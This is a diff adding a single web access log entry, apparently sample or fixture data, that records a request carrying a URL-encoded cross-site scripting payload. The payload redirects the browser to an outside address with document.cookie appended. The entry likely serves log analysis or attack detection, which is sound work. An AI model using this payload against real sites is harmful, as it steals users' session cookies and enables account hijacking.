@@ -1,0 +1,1 @@
+203.0.113.47 - - [24/Nov/2026:10:22:05 +0000] "GET /search?q=%3Cscript%3Edocument.location%3D%27http://203.0.113.9/c?%27%2Bdocument.cookie%3C/script%3E HTTP/1.1" 200 2210 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
